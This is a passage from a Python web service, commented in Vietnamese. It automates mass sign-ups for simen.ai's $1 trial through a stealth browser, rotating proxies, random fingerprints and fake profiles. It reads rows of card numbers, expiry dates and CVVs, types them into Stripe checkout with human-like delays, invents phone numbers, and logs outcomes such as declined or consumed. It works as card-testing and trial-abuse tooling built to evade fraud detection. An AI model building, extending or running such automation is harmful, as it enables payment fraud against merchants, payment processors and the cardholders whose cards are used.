                    () => {
                        const ifr = document.querySelector(
                            'iframe[title*="card" i], iframe[title*="payment" i], iframe[title*="Secure" i]'
                        );
                        if (ifr) {
                            ifr.style.setProperty('height', '100px', 'important');
                            ifr.style.setProperty('min-height', '80px', 'important');
                        }
                    }
                """)
            except Exception:
                pass
            _t3.sleep(0.3)
            # Tìm iframe element
            card_ifr = None
            for sel_ifr in [
                'iframe[title*="card" i]',
                'iframe[title*="payment" i]',
                'iframe[title*="Secure" i]',
                'iframe[name*="privateStripeFrame"]',
            ]:
                try:
                    card_ifr = page.query_selector(sel_ifr)
                    if card_ifr:
                        break
                except Exception:
                    pass
            if card_ifr:
                try:
                    bb = card_ifr.bounding_box()
                    if bb and bb['width'] > 10:
                        cx = bb['x'] + bb['width'] * 0.1
                        cy = bb['y'] + bb['height'] / 2
                        page.mouse.click(cx, cy)
                        _t3.sleep(0.4)
                        for ch in value:
                            page.keyboard.press(ch)
                            _t3.sleep(0.06 + _rnd.uniform(0, 0.04))
                        _t3.sleep(0.3)
                        log(f"✓ {label} OK (iframe mouse+key, x={cx:.0f})")
                        return True
                except Exception as _be:
                    log(f"  iframe click err: {_be}")
            if attempt < retries - 1:
                log(f"⏳ {label} chưa thấy, chờ 3s (attempt {attempt+1}/{retries})...")
                page.wait_for_timeout(3000)
        log(f"⚠ {label}: không điền được sau {retries} lần thử")
        return False

    def wait_navigation(page, expected_patterns=None, timeout=20000):
        """Chờ URL thay đổi hoặc pattern khớp."""
        try:
            if expected_patterns:
                for pat in expected_patterns:
                    try:
                        page.wait_for_url(pat, timeout=timeout)
                        return True
                    except Exception:
                        continue
            else:
                page.wait_for_load_state("networkidle", timeout=timeout)
            return True
        except Exception:
            return False

    def proxy_precheck(proxy_url):
        """Ping nhanh proxy trước khi dùng — timeout 8s."""
        if not proxy_url:
            return True, None  # không có proxy thì skip
        proxies_cfg = {"http": proxy_url, "https": proxy_url}
        try:
            t0 = _time.time()
            r = _req.get("https://ipinfo.io/ip", proxies=proxies_cfg, timeout=8)
            ms = int((_time.time() - t0) * 1000)
            ip = r.text.strip()
            return True, f"{ip} ({ms}ms)"
        except Exception as e:
            return False, str(e)

    try:
        from invisible_playwright import InvisiblePlaywright

        # ── Setup proxy từ profile hoặc pool ────────────────────────────────
        kwargs: dict = {}
        _proxy_url = None

        _proxy_src  = profile.get("proxy_server")
        _proxy_user = profile.get("proxy_username", "")
        _proxy_pass = profile.get("proxy_password", "")

        if not _proxy_src:
            _ws_px = pick_next_proxy()
            if _ws_px:
                _proxy_src  = _ws_px["server"]
                _proxy_user = _ws_px.get("username", "")
                _proxy_pass = _ws_px.get("password", "")
                log(f"[Auto] Proxy pool: {_ws_px['host']}:{_ws_px['port']}")

        if _proxy_src:
            if _proxy_user:
                # socks5://user:pass@host:port
                base = _proxy_src.split("://",1)[-1]
                _proxy_url = f"socks5://{_proxy_user}:{_proxy_pass}@{base}"
            else:
                _proxy_url = _proxy_src

            # ── Pre-check proxy ──────────────────────────────────────────────
            log(f"⏱ Kiểm tra proxy: {_proxy_src} ...")
            ok, info = proxy_precheck(_proxy_url)
            if ok:
                log(f"✅ Proxy OK — IP: {info}")
            else:
                log(f"⚠ Proxy yếu/dead: {info} — tiếp tục nhưng có thể chậm")

            proxy = {"server": _proxy_src}
            if _proxy_user: proxy["username"] = _proxy_user
            if _proxy_pass: proxy["password"] = _proxy_pass
            kwargs["proxy"] = proxy

        if profile.get("seed") is not None:
            kwargs["seed"] = int(profile["seed"])
        if profile.get("timezone"):
            kwargs["timezone"] = profile["timezone"]

        total = len(rows)
        log(f"Bắt đầu — {total} hàng")
        running_tasks[tid]["total"] = total
        running_tasks[tid]["done"]  = 0

        for idx, row in enumerate(rows):
            if not alive():
                log("⛔ Task bị dừng.")
                break

            email           = row.get("email","").strip() or _random_email()
            password        = row.get("password","").strip() or _random_password(12)
            card_number     = row.get("card_number","").strip().replace(" ","")
            exp_month       = row.get("exp_month","").strip().zfill(2)
            exp_year        = row.get("exp_year","").strip()
            cvv             = row.get("cvv","").strip()
            cardholder_name = row.get("cardholder_name","").strip()
            zip_code        = row.get("zip","").strip()
            exp_year_2      = exp_year[-2:] if len(exp_year) >= 2 else exp_year
            exp_mmyy        = f"{exp_month}{exp_year_2}"

            log(f"─── [{idx+1}/{total}] {email} ───")

            try:
                ip_client = InvisiblePlaywright(**kwargs)
                with ip_client as browser:
                    page = browser.new_page()

                    # ── STEP 1: Mở trang ──────────────────────────────────────
                    log(f"[{idx+1}] Mở simen.ai ...")
                    page.goto("https://simen.ai/", wait_until="domcontentloaded", timeout=40000)
                    page.wait_for_load_state("networkidle", timeout=15000)
                    log(f"[{idx+1}] URL: {page.url[:70]}")

                    # ── STEP 2: Click Try for $1 ──────────────────────────────
                    log(f"[{idx+1}] Tìm nút $1 trial ...")
                    trial_clicked = smart_click(page, [
                        "text=Try for $1",
                        "text=Start your $1 trial",
                        "button:has-text('$1')",
                        "a:has-text('Try for $1')",
                        "a:has-text('Get Started')",
                        "button:has-text('Get Started')",
                    ], label="Trial button", timeout=10000)
                    if not trial_clicked:
                        log(f"[{idx+1}] ⚠ Không thấy nút trial — thử vào /signup trực tiếp")
                        page.goto("https://simen.ai/signup", wait_until="domcontentloaded", timeout=30000)
                    page.wait_for_timeout(800)

                    # ── STEP 3: Điền email ────────────────────────────────────
                    log(f"[{idx+1}] Điền email ...")
                    email_ok = smart_fill(page, [
                        "input[type='email']",
                        "input[name='email']",
                        "input[placeholder*='email' i]",
                        "input[autocomplete='email']",
                    ], email, label="Email", timeout=10000)
                    if not email_ok:
                        raise Exception("Không tìm được email input")
                    page.wait_for_timeout(300)

                    # ── STEP 4: Click Continue ────────────────────────────────
                    log(f"[{idx+1}] Click Continue ...")
                    smart_click(page, [
                        "button:has-text('Continue')",
                        "button[type='submit']:not([disabled])",
                        "button:has-text('Next')",
                    ], label="Continue", timeout=6000)
                    page.wait_for_timeout(1500)

                    # ── STEP 5: Password ──────────────────────────────────────
                    # Có thể đã có 2 field pw (pw + confirm), điền cả 2
                    log(f"[{idx+1}] Điền password ...")
                    pw_fields = page.locator("input[type='password']").all()
                    if len(pw_fields) == 0:
                        # chờ thêm
                        page.wait_for_selector("input[type='password']", timeout=8000)
                        pw_fields = page.locator("input[type='password']").all()
                    for i, pw_el in enumerate(pw_fields[:2]):
                        try:
                            pw_el.wait_for(state="visible", timeout=5000)
                            pw_el.click()
                            pw_el.press("Control+a")
                            page.wait_for_timeout(80)
                            for ch in password:
                                pw_el.press_sequentially(ch, delay=55 + _rnd.randint(0, 30))
                            log(f"[{idx+1}] ✓ Password field {i+1} điền xong")
                        except Exception:
                            pass
                    page.wait_for_timeout(300)

                    # ── STEP 6: Click Create account / Sign up ────────────────
                    log(f"[{idx+1}] Click Create account ...")
                    smart_click(page, [
                        "button:has-text('Create account')",
                        "button:has-text('Create Account')",
                        "button:has-text('Sign up')",
                        "button:has-text('Sign Up')",
                        "button[type='submit']:not([disabled])",
                    ], label="Create account", timeout=6000)

                    # Chờ redirect sau signup
                    log(f"[{idx+1}] ⏳ Chờ account tạo xong ...")
                    wait_navigation(page, [
                        "**/dashboard**", "**/pricing**", "**/app**", "**/home**"
                    ], timeout=20000)
                    log(f"[{idx+1}] URL sau signup: {page.url[:70]}")

                    # ── STEP 7: Pricing → Lite ────────────────────────────────
                    cur = page.url
                    if "pricing" not in cur:
                        log(f"[{idx+1}] → /pricing ...")
                        page.goto("https://simen.ai/pricing", wait_until="domcontentloaded", timeout=30000)
                        page.wait_for_load_state("networkidle", timeout=10000)

                    log(f"[{idx+1}] Chọn Lite plan ...")
                    lite_clicked = smart_click(page, [
                        "button:has-text('Start with Lite')",
                        "button:has-text('Chọn Lite')",
                        "button:has-text('Get Lite')",
                        "button:has-text('Choose Lite')",
                        "button:has-text('Try Lite')",
                    ], label="Lite plan", timeout=8000)
                    if not lite_clicked:
                        # fallback: click nút "Start" đầu tiên (thường là Lite = rẻ nhất)
                        try:
                            first_btn = page.locator("button:has-text('Start')").first
                            first_btn.wait_for(state="visible", timeout=5000)
                            first_btn.click()
                            lite_clicked = True
                            log(f"[{idx+1}] ✓ Lite fallback: first Start button")
                        except Exception:
                            pass
                    if not lite_clicked:
                        raise Exception("Không tìm được Lite plan button")

                    # Chờ redirect tới Stripe checkout
                    log(f"[{idx+1}] ⏳ Chờ Stripe checkout ...")
                    wait_navigation(page, [
                        "**/checkout.stripe.com/**",
                        "**/checkout**",
                        "**stripe**",
                        "**/payment**",
                    ], timeout=25000)
                    log(f"[{idx+1}] URL checkout: {page.url[:80]}")

                    # ── STEP 8: Stripe card ───────────────────────────────────
                    if not card_number:
                        log(f"[{idx+1}] ⚠ Không có card — dừng tại checkout")
                    else:
                        log(f"[{idx+1}] 💳 Điền card ...")
                        # Đợi Stripe render xong (proxy chậm cần thêm thời gian)
                        page.wait_for_load_state("networkidle", timeout=20000)
                        page.wait_for_timeout(3000)

                        # Log frames để debug
                        frame_urls = [f.url[:60] for f in page.frames if f.url]
                        log(f"[{idx+1}] Frames ({len(frame_urls)}): {frame_urls}")

                        # Log inputs main page
                        main_inputs = page.query_selector_all('input')
                        inp_info = []
                        for _inp in main_inputs[:10]:
                            inp_info.append(f"name={_inp.get_attribute('name') or ''} "
                                            f"type={_inp.get_attribute('type') or ''} "
                                            f"ph={(_inp.get_attribute('placeholder') or '')[:20]}")
                        log(f"[{idx+1}] Main inputs ({len(main_inputs)}): {inp_info}")

                        # ── Detect loại Stripe checkout ──────────────────────
                        # checkout.stripe.com: inputs trên main page
                        # Stripe Elements embedded: iframes cross-origin
                        _cur_url = page.url
                        _is_hosted = "checkout.stripe.com" in _cur_url or "buy.stripe.com" in _cur_url

                        if _is_hosted:
                            log(f"[{idx+1}] → Stripe Hosted Checkout (main page inputs)")
                        else:
                            log(f"[{idx+1}] → Stripe Elements embedded (iframe approach)")

                        # ── Card selectors cho Hosted Checkout ───────────────
                        card_sel_hosted = [
                            'input[name="cardNumber"]',
                            'input[autocomplete="cc-number"]',
                            'input[autocomplete*="cc-number"]',
                            'input[placeholder*="1234"]',
                            'input[placeholder*="Card number" i]',
                        ]
                        exp_sel_hosted = [
                            'input[name="cardExpiry"]',
                            'input[autocomplete="cc-exp"]',
                            'input[autocomplete*="cc-exp"]',
                            'input[placeholder*="MM / YY" i]',
                            'input[placeholder*="MM/YY" i]',
                        ]
                        cvc_sel_hosted = [
                            'input[name="cardCvc"]',
                            'input[autocomplete="cc-csc"]',
                            'input[autocomplete*="cc-csc"]',
                            'input[placeholder*="CVC" i]',
                            'input[placeholder*="CVV" i]',
                        ]

                        card_ok = exp_ok = cvc_ok = False

                        if _is_hosted:
                            # Hosted: điền từng field riêng lẻ
                            card_ok = frame_fill(page, card_sel_hosted, card_number, "Card number", retries=3)
                            page.wait_for_timeout(300)
                            exp_ok  = frame_fill(page, exp_sel_hosted, exp_mmyy, "Expiry", retries=3)
                            page.wait_for_timeout(300)
                            cvc_ok  = frame_fill(page, cvc_sel_hosted, cvv, "CVC", retries=3)
                        else:
                            # Stripe Elements embedded: 1 iframe duy nhất, auto-advance giữa fields
                            # Resize iframe + click card number + type tất cả liên tục
                            import time as _t_card
                            _stripe_ok = False
                            for _attempt in range(4):
                                try:
                                    # Resize iframe
                                    page.evaluate("""
                                        () => {
                                            const ifr = document.querySelector(
                                                'iframe[title*="card" i], iframe[title*="payment" i], iframe[title*="Secure" i]'
                                            );
                                            if (ifr) {
                                                ifr.style.setProperty('height', '100px', 'important');
                                                ifr.style.setProperty('min-height', '80px', 'important');
                                            }
                                        }
                                    """)
                                    _t_card.sleep(0.4)

                                    _card_ifr = None
                                    for _sel_ifr in [
                                        'iframe[title*="card" i]',
                                        'iframe[title*="payment" i]',
                                        'iframe[title*="Secure" i]',
                                        'iframe[name*="privateStripeFrame"]',
                                    ]:
                                        _card_ifr = page.query_selector(_sel_ifr)
                                        if _card_ifr:
                                            break

                                    if not _card_ifr:
                                        log(f"[{idx+1}] ⏳ Chưa thấy Stripe iframe, chờ 3s ({_attempt+1}/4)...")
                                        page.wait_for_timeout(3000)
                                        continue

                                    _bb = _card_ifr.bounding_box()
                                    if not _bb or _bb['width'] < 10:
                                        log(f"[{idx+1}] iframe bbox invalid: {_bb}, chờ 3s...")
                                        page.wait_for_timeout(3000)
                                        continue

                                    log(f"[{idx+1}] iframe bbox: {_bb}")

                                    # Click vào vùng card number (x=10%)
                                    _cx = _bb['x'] + _bb['width'] * 0.1
                                    _cy = _bb['y'] + _bb['height'] / 2
                                    page.mouse.click(_cx, _cy)
                                    _t_card.sleep(0.5)

                                    # Type card number
                                    for _ch in card_number:
                                        page.keyboard.press(_ch)
                                        _t_card.sleep(0.06 + _rnd.uniform(0, 0.04))
                                    _t_card.sleep(0.5)
                                    # Stripe auto-advance → exp field
                                    for _ch in exp_mmyy:
                                        page.keyboard.press(_ch)
                                        _t_card.sleep(0.06 + _rnd.uniform(0, 0.04))
                                    _t_card.sleep(0.5)
                                    # Stripe auto-advance → CVC field
                                    for _ch in cvv:
                                        page.keyboard.press(_ch)
                                        _t_card.sleep(0.06 + _rnd.uniform(0, 0.04))
                                    _t_card.sleep(0.3)

                                    log(f"[{idx+1}] ✓ Stripe Elements: card+exp+cvc điền xong")
                                    card_ok = exp_ok = cvc_ok = _stripe_ok = True
                                    break
                                except Exception as _ce:
                                    log(f"[{idx+1}] Elements fill err ({_attempt+1}): {_ce}")
                                    page.wait_for_timeout(2000)

                            if not _stripe_ok:
                                # Fallback: thử từng field riêng qua frame_fill
                                log(f"[{idx+1}] Fallback: thử frame_fill từng field...")
                                card_ok = frame_fill(page, card_sel_hosted + [
                                    'input[name="cardnumber"]',
                                ], card_number, "Card number", retries=2)
                                page.wait_for_timeout(300)
                                exp_ok = frame_fill(page, exp_sel_hosted + [
                                    'input[name="exp-date"]',
                                ], exp_mmyy, "Expiry", retries=2)
                                page.wait_for_timeout(300)
                                cvc_ok = frame_fill(page, cvc_sel_hosted + [
                                    'input[name="cvc"]',
                                ], cvv, "CVC", retries=2)

                        log(f"[{idx+1}] Card fill: card={card_ok} exp={exp_ok} cvc={cvc_ok}")
                        page.wait_for_timeout(300)

                        # Cardholder name
                        if cardholder_name:
                            smart_fill(page, [
                                'input[name="billingName"]',
                                'input[autocomplete*="cc-name"]',
                                'input[placeholder*="Name on card" i]',
                                'input[placeholder*="Cardholder" i]',
                            ], cardholder_name, label="Cardholder name", timeout=3000)
                            page.wait_for_timeout(200)

                        # ZIP
                        if zip_code:
                            smart_fill(page, [
                                'input[name="postalCode"]',
                                'input[autocomplete*="postal-code"]',
                                'input[placeholder*="ZIP" i]',
                            ], zip_code, label="ZIP", timeout=3000)
                            page.wait_for_timeout(200)

                        # Phone (Stripe Link popup)
                        _area_codes = ['201','212','213','312','404','415','512','617','702','917']
                        _phone = f"({_rnd.choice(_area_codes)}) {_rnd.randint(200,999)}-{_rnd.randint(1000,9999)}"
                        try:
                            for frame in page.frames:
                                inp = frame.locator('input[name="phoneNumber"], input[type="tel"]').first
                                try:
                                    inp.wait_for(state="visible", timeout=2000)
                                    inp.click()
                                    for ch in _phone:
                                        inp.press_sequentially(ch, delay=55)
                                    log(f"[{idx+1}] Phone: {_phone}")
                                    break
                                except Exception:
                                    pass
                        except Exception:
                            pass

                        page.wait_for_timeout(800)

                        # ── Click Pay ──────────────────────────────────────────
                        log(f"[{idx+1}] 🖱 Click Pay ...")
                        pay_clicked = smart_click(page, [
                            '[data-testid="hosted-payment-submit-button"]',
                            'button:has-text("Pay")',
                            'button:has-text("Subscribe")',
                            'button:has-text("Start trial")',
                            'button:has-text("Start Trial")',
                            'button:has-text("Confirm")',
                            'button[type="submit"]',
                        ], label="Pay button", timeout=8000)

                        if not pay_clicked:
                            log(f"[{idx+1}] ⚠ Không tìm được Pay button — thử JS click")
                            try:
                                result = page.evaluate("""
                                    () => {
                                        const btn = [...document.querySelectorAll('button')].find(b =>
                                            /pay|subscribe|start trial|confirm/i.test(b.textContent)
                                        );
                                        if(btn && !btn.disabled){ btn.click(); return btn.textContent.trim(); }
                                        return null;
                                    }
                                """)
                                if result:
                                    log(f"[{idx+1}] ✓ JS click: '{result}'")
                                    pay_clicked = True
                            except Exception:
                                pass

                        # Chờ kết quả payment
                        log(f"[{idx+1}] ⏳ Chờ kết quả payment ...")
                        success = wait_navigation(page, [
                            "**/dashboard**", "**/success**", "**/thank**", "**/home**"
                        ], timeout=25000)

                        final_url = page.url
                        if any(x in final_url for x in ["dashboard","success","thank","home"]):
                            log(f"[{idx+1}] ✅ THÀNH CÔNG — {final_url[:80]}")
                            running_tasks[tid]["results"].append({
                                "email": email, "status": "success", "url": final_url
                            })
                        else:
                            log(f"[{idx+1}] ℹ URL sau pay: {final_url[:80]}")
                            running_tasks[tid]["results"].append({
                                "email": email, "status": "unknown", "url": final_url
                            })

                    running_tasks[tid]["done"] = idx + 1
                    log(f"[{idx+1}] ✓ Xong")

            except Exception as e:
                import traceback
                tb = traceback.format_exc()
                log(f"[{idx+1}] ❌ Lỗi: {e}")
                log(f"[{idx+1}] Traceback: {tb[-300:]}")
                running_tasks[tid]["done"] = idx + 1
                running_tasks[tid]["results"].append({
                    "email": email if 'email' in dir() else "?", "status": "error", "error": str(e)
                })

    except Exception as e:
        import traceback
        push_task_log(tid, f"❌ Lỗi khởi tạo: {e}\n{traceback.format_exc()[-300:]}")

    finally:
        if tid in running_tasks:
            running_tasks[tid]["alive"] = False
            running_tasks[tid]["status"] = "done"
        push_task_log(tid, "🏁 Script hoàn tất.")


SCRIPT_RUNNERS = {
    "dropaudit_signup": _run_dropaudit_signup,
    "simen_trial": _run_simen_trial,
}

# ══════════════════════════════════════════════════════════════════════════════
# QUEUE — data rows chờ chạy
# ══════════════════════════════════════════════════════════════════════════════
_queue_lock = threading.Lock()
_data_queue: list[dict] = []   # [{...row, _idx, _status: pending/running/done/failed}]

def queue_set(rows: list[dict]):
    global _data_queue
    with _queue_lock:
        _data_queue = [{"_idx": i, "_status": "pending", **r} for i, r in enumerate(rows)]

def queue_pop() -> dict | None:
    """Lấy 1 hàng pending, đánh dấu running. Thread-safe."""
    with _queue_lock:
        for row in _data_queue:
            if row["_status"] == "pending":
                row["_status"] = "running"
                return dict(row)
    return None

def queue_done(idx: int, status: str):
    with _queue_lock:
        for row in _data_queue:
            if row["_idx"] == idx:
                row["_status"] = status
                if status in ("done", "success", "consumed", "declined", "failed"):
                    row["email"] = ""
                    row["password"] = ""
                break

def queue_get_all():
    with _queue_lock:
        return list(_data_queue)

class QueuePushBody(BaseModel):
    rows: list[dict]

@app.get("/api/queue")
def get_queue():
    rows = queue_get_all()
    return {"rows": rows, "count": len(rows)}

@app.post("/api/queue")
def push_queue(body: QueuePushBody):
    with _queue_lock:
        start = len(_data_queue)
        for i, r in enumerate(body.rows):
            _data_queue.append({"_idx": start + i, "_status": "pending", **r})
    return {"added": len(body.rows), "total": len(_data_queue)}

@app.delete("/api/queue")
def clear_queue():
    global _data_queue
    with _queue_lock:
        _data_queue = []
    return {"cleared": True}

@app.post("/api/queue/clean")
def clean_queue():
    global _data_queue
    with _queue_lock:
        before = len(_data_queue)
        _data_queue = [r for r in _data_queue if r.get("_status","pending") not in ("done","failed","consumed")]
        removed = before - len(_data_queue)
    return {"removed": removed, "remaining": len(_data_queue)}

# ══════════════════════════════════════════════════════════════════════════════
# BULK PROFILE APIS
# ══════════════════════════════════════════════════════════════════════════════
RANDOM_NAMES_FIRST = ["Alex","Blake","Casey","Dana","Drew","Evan","Flynn","Gray","Harley","Indigo",
    "Jamie","Kai","Lane","Morgan","Nova","Owen","Parker","Quinn","Riley","Sam",
    "Taylor","Urban","Vale","West","Xen","Yara","Zane","Avery","Brett","Cody"]
RANDOM_NAMES_LAST  = ["Smith","Johnson","Brown","Taylor","Anderson","Thomas","Jackson","White",
    "Harris","Martin","Garcia","Martinez","Robinson","Clark","Lewis","Lee","Walker",
    "Hall","Allen","Young","King","Scott","Green","Baker","Adams","Nelson","Hill","Ramirez"]

class BulkCreateBody(BaseModel):
    count: int
    prefix: Optional[str] = None

@app.post("/api/profiles/bulk", status_code=201)
def bulk_create_profiles(body: BulkCreateBody):
    data = load_data()
    created = []
    for i in range(body.count):
        pid = str(uuid.uuid4())[:8]
        fn = random.choice(RANDOM_NAMES_FIRST)
        ln = random.choice(RANDOM_NAMES_LAST)
        name = f"{body.prefix or ''}{fn} {ln}" if body.prefix else f"{fn} {ln}"
        data["profiles"][pid] = {
            "name": name,
            "proxy_server": None,
            "proxy_username": None,
            "proxy_password": None,
            "seed": random.randint(1, 999999),
            "timezone": "America/New_York",
            "created_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        }
        created.append(pid)
    save_data(data)
    return {"created": len(created), "ids": created}

class BulkAssignProxyBody(BaseModel):
    profile_ids: list[str]

@app.post("/api/profiles/bulk-assign-proxy")
def bulk_assign_proxy(body: BulkAssignProxyBody):
    """Gán proxy ngẫu nhiên từ pool nội bộ cho từng profile."""
    pool = load_proxies()
    available = pool.get("proxies", [])
    if not available:
        raise HTTPException(400, "Chưa có proxy trong pool")
    data = load_data()
    results = []
    pool_len = len(available)
    for i, pid in enumerate(body.profile_ids):
        if pid not in data["profiles"]:
            results.append({"profile_id": pid, "ok": False, "error": "not found"})
            continue
        px = available[i % pool_len]
        prof = data["profiles"][pid]
        prof["proxy_server"]   = f"socks5://{px['host']}:{px['port']}"
        prof["proxy_username"] = ""
        prof["proxy_password"] = ""
        if not prof.get("seed"):
            prof["seed"] = random.randint(1, 99999)
        results.append({"profile_id": pid, "ok": True, "proxy": prof["proxy_server"]})
    # tăng used_count
    pool2 = load_proxies()
    used_ids = {r["profile_id"] for r in results if r.get("ok")}
    for i, pid in enumerate(body.profile_ids):
        if pid in used_ids:
            px = pool2["proxies"][i % len(pool2["proxies"])]
            px["used_count"] = px.get("used_count", 0) + 1
    save_proxies(pool2)
    save_data(data)
    return {"assigned": len([r for r in results if r.get("ok")]), "results": results}

# ══════════════════════════════════════════════════════════════════════════════
# MULTI-PROFILE RUN
# ══════════════════════════════════════════════════════════════════════════════
class MultiRunRequest(BaseModel):
    script_id: str
    profile_ids: list[str]

@app.post("/api/tasks/run-multi")
def run_multi_task(body: MultiRunRequest):
    data = load_data()
    if body.script_id not in SCRIPT_RUNNERS:
        raise HTTPException(404, "Script not found")
    if not body.profile_ids:
        raise HTTPException(400, "Không có profile")

    runner = SCRIPT_RUNNERS[body.script_id]
    task_ids = []

    for pid in body.profile_ids:
        if pid not in data["profiles"]:
            continue
        profile = data["profiles"][pid]
        tid = str(uuid.uuid4())[:8]

        running_tasks[tid] = {
            "id": tid,
            "script_id": body.script_id,
            "profile_id": pid,
            "profile_name": profile.get("name", pid),
            "status": "running",
            "alive": True,
            "total": 1,
            "done": 0,
            "logs": deque(maxlen=500),
            "results": [],
            "created_at": time.strftime("%Y-%m-%d %H:%M:%S"),
            "_stop_event": threading.Event(),
        }

        # Lấy 1 hàng từ queue cho profile này
        row = queue_pop()
        if row is None:
            running_tasks[tid]["status"] = "done"
            running_tasks[tid]["logs"].append("Không còn dữ liệu trong queue")
            task_ids.append(tid)
            continue

        row_idx = row.get("_idx", 0)

        def make_runner(t, p, r, ri):
            def _run():
                try:
                    runner(t, p, [r])
                    final = running_tasks.get(t, {}).get("status", "done")
                    queue_done(ri, "done" if final == "done" else "failed")
                except Exception as ex:
                    if t in running_tasks:
                        running_tasks[t]["status"] = "failed"
                    queue_done(ri, "failed")
            return _run

        t = threading.Thread(target=make_runner(tid, profile, row, row_idx), daemon=True)
        t.start()
        running_tasks[tid]["thread"] = t
        task_ids.append(tid)

    return {"task_ids": task_ids, "queued": len(_data_queue)}

# ══════════════════════════════════════════════════════════════════════════════
# PROXY POOL APIs  (host:port SOCKS5, không auth)
# ══════════════════════════════════════════════════════════════════════════════

class ProxyImportBody(BaseModel):
    lines: str  # multi-line text, mỗi dòng là host:port

@app.get("/api/proxies")
def api_list_proxies():
    pool = load_proxies()
    return pool.get("proxies", [])

@app.post("/api/proxies/import")
def api_import_proxies(body: ProxyImportBody):
    pool = load_proxies()
    existing_keys = {f"{p['host']}:{p['port']}" for p in pool["proxies"]}
    added = 0
    for line in body.lines.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        # strip protocol prefix nếu có
        if "://" in line:
            line = line.split("://", 1)[1]
        # host:port
        parts = line.split(":")
        if len(parts) < 2:
            continue
        host = parts[0].strip()
        try:
            port = int(parts[1].strip())
        except ValueError:
            continue
        key = f"{host}:{port}"
        if key in existing_keys:
            continue
        pool["proxies"].append({
            "id":         uuid.uuid4().hex[:8],
            "host":       host,
            "port":       port,
            "used_count": 0,
            "alive":      None,   # None = chưa check
            "ping_ms":    None,
            "last_ip":    None,
            "checked_at": None,
            "added_at":   time.strftime("%Y-%m-%d %H:%M:%S"),
        })
        existing_keys.add(key)
        added += 1
    save_proxies(pool)
    return {"added": added, "total": len(pool["proxies"])}

@app.delete("/api/proxies/{proxy_id}")
def api_delete_proxy(proxy_id: str):
    pool = load_proxies()
    before = len(pool["proxies"])
    pool["proxies"] = [p for p in pool["proxies"] if p["id"] != proxy_id]
    if len(pool["proxies"]) == before:
        raise HTTPException(404, "Proxy không tồn tại")
    save_proxies(pool)
    return {"ok": True}

@app.delete("/api/proxies")
def api_clear_proxies():
    save_proxies({"proxies": []})
    return {"ok": True}

@app.post("/api/proxies/{proxy_id}/check")
def api_check_proxy(proxy_id: str):
    """Check live/die + ping qua ipinfo.io"""
    import requests as _req, time as _time
    pool = load_proxies()
    px = next((p for p in pool["proxies"] if p["id"] == proxy_id), None)
    if not px:
        raise HTTPException(404, "Proxy không tồn tại")

    proxy_url = f"socks5h://{px['host']}:{px['port']}"
    proxies_cfg = {"http": proxy_url, "https": proxy_url}
    ms = None; ip = None; alive = False; err = ""
    try:
        t0 = _time.time()
        r = _req.get("https://ipinfo.io/ip", proxies=proxies_cfg, timeout=15)
        ms = int((_time.time() - t0) * 1000)
        ip = r.text.strip()
        alive = r.status_code == 200 and len(ip) > 3
    except Exception as e:
        err = str(e)

    # update an toàn (atomic)
    update_proxy_fields(proxy_id, {
        "alive": alive,
        "ping_ms": ms,
        "last_ip": ip,
        "checked_at": time.strftime("%Y-%m-%d %H:%M:%S"),
    })
    result = {"ok": alive, "ping_ms": ms, "ip": ip, "id": proxy_id}
    if not alive:
        result["error"] = err
    return result

# Trạng thái check-all để UI poll
_check_all_state = {"running": False, "total": 0, "done": 0, "started_at": None}
_check_all_lock = threading.Lock()

@app.post("/api/proxies/check-all")
def api_check_all_proxies():
    """
    Check tất cả proxy với SỐ LƯỢNG GIỚI HẠN song song (worker pool).

    Lỗi cũ: tạo 1 thread/proxy → với list lớn (vài chục+) sẽ:
      - cạn socket / ipinfo.io rate-limit → lỗi
      - nhiều thread cùng ghi đè cả file proxies.json → race → JSON hỏng → API lỗi
    Nay: dùng ThreadPoolExecutor (max 8 worker) + update_proxy_fields() atomic.
    """
    pool = load_proxies()
    proxy_ids = [p["id"] for p in pool["proxies"]]

    with _check_all_lock:
        if _check_all_state["running"]:
            return {"ok": True, "already_running": True, **_check_all_state}
        _check_all_state.update({
            "running": True, "total": len(proxy_ids), "done": 0,
            "started_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        })

    def _check_all():
        from concurrent.futures import ThreadPoolExecutor
        try:
            # Giới hạn 8 worker → ổn định kể cả khi import hàng trăm proxy
            with ThreadPoolExecutor(max_workers=8) as ex:
                futures = [ex.submit(_do_check_one, pid) for pid in proxy_ids]
                for f in futures:
                    try:
                        f.result()
                    except Exception:
                        pass
                    with _check_all_lock:
                        _check_all_state["done"] += 1
        finally:
            with _check_all_lock:
                _check_all_state["running"] = False

    threading.Thread(target=_check_all, daemon=True).start()
    return {"ok": True, "checking": len(proxy_ids)}

@app.get("/api/proxies/check-all/status")
def api_check_all_status():
    with _check_all_lock:
        return dict(_check_all_state)

def _do_check_one(proxy_id: str):
    import requests as _req, time as _time
    pool = load_proxies()
    px = next((p for p in pool["proxies"] if p["id"] == proxy_id), None)
    if not px:
        return
    proxy_url = f"socks5h://{px['host']}:{px['port']}"
    proxies_cfg = {"http": proxy_url, "https": proxy_url}
    ms = None; ip = None; alive = False
    try:
        t0 = _time.time()
        r = _req.get("https://ipinfo.io/ip", proxies=proxies_cfg, timeout=15)
        ms = int((_time.time() - t0) * 1000)
        ip = r.text.strip()
        alive = r.status_code == 200 and len(ip) > 3
    except Exception:
        pass

    # Update an toàn từng proxy — KHÔNG ghi đè cả file
    update_proxy_fields(proxy_id, {
        "alive": alive,
        "ping_ms": ms,
        "last_ip": ip,
        "checked_at": time.strftime("%Y-%m-%d %H:%M:%S"),
    })

@app.post("/api/tasks/run")
def run_task(body: RunTaskRequest):
    data = load_data()
    if body.script_id not in SCRIPT_RUNNERS:
        raise HTTPException(404, "Script not found")
    if not body.data_rows:
        raise HTTPException(400, "Không có dữ liệu")

    # Profile optional — nếu không chọn thì dùng fingerprint ngẫu nhiên
    if body.profile_id and body.profile_id in data["profiles"]:
        profile = data["profiles"][body.profile_id]
        profile_name = profile["name"]
    else:
        profile = {}  # InvisiblePlaywright sẽ tự sinh fingerprint
        profile_name = "Random Fingerprint"

    tid = str(uuid.uuid4())[:8]

    running_tasks[tid] = {
        "id": tid,
        "script_id": body.script_id,
        "profile_id": body.profile_id or "random",
        "profile_name": profile_name,
        "status": "running",
        "alive": True,
        "total": len(body.data_rows),
        "done": 0,
        "logs": deque(maxlen=500),
        "results": [],
        "created_at": time.strftime("%Y-%m-%d %H:%M:%S"),
    }

    runner = SCRIPT_RUNNERS[body.script_id]
    t = threading.Thread(target=runner, args=(tid, profile, body.data_rows), daemon=True)
    t.start()
